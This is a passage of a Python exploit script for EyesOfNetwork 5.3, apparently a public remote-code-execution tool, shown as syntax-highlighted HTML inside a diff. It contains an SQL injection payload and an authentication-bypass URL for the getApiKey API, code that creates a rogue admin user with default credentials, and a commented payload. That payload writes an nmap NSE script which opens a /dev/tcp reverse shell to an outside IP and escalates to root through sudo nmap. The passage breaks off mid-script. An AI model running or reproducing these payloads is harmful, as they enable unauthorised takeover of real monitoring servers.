+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#                 PoC: /eonapi/getApiKey?username=&amp;#39; union select sleep(3),0,0,0,0,0,0,0 or &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#                 Auth bypass: /eonapi/getApiKey?&amp;amp;username=&amp;#39; union select 1,&amp;#39;admin&amp;#39;,&amp;#39;1c85d47ff80b5ff2a4dd577e8e5f8e9d&amp;#39;,0,0,1,1,8 or &amp;#39;&amp;amp;password=h4knet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Changelog&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# v1.0 - 02/2020 - Initial release&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# v1.1 - 03/2020 - Add parameters output; banner update&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Python imports&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Text colors&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_yellow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;33m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_blue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;34m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_red&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;31m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_green&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;32m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_bold&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;01m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_reset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[00m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;txt_blue&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;[*] &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_success&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;txt_green&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;[+] &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_warn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;txt_yellow&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;[!] &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;txt_red&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;[x] &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Banner&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_bold&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;+-----------------------------------------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| EyesOfNetwork 5.3 RCE                                                       |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| 03/2020 - v1.1 - Clément Billac &lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;34mTwitter: @h4knet&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[00m                            |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;|                                                                             |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| Examples:                                                                   |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| eonrce.py -h                                                                |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| eonrce.py http(s)://EyesOfNetwork-URL                                       |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;+-----------------------------------------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Arguments Parser&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ArgumentParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;eonrce&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;formatter_class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RawDescriptionHelpFormatter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;usage&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;URL&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;URL&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;URL of the EyesOfNetwork server&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-ip&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;IP&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Local IP to receive reverse shell&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gethostbyname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gethostname&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-port&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Port&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Local port to listen&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;443&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-user&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Username&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Name of the new user to create&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;h4ker&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-password&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Password of the new user&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;net_was_here&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# HTTP Requests config&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;packages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urllib3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;disable_warnings&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;useragent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (Windows NT 1.0; WOW64; rv:13.37) Gecko/20200104 Firefox/13.37&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Admin user creation variables&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;new_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;new_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Executed command&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# The following payload performs both the LPE and the reverse shell in a single command.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Readable PoC: ;echo &amp;#34;local os = require \&amp;#34;os\&amp;#34; hostrule=function(host) os.execute(\&amp;#34;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/192.168.30.112/8081 0&amp;gt;&amp;amp;1\&amp;#34;) end action=function() end&amp;#34; &amp;gt; /tmp/h4k;sudo /usr/bin/nmap localhost -p 1337 -script /tmp/h4k #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
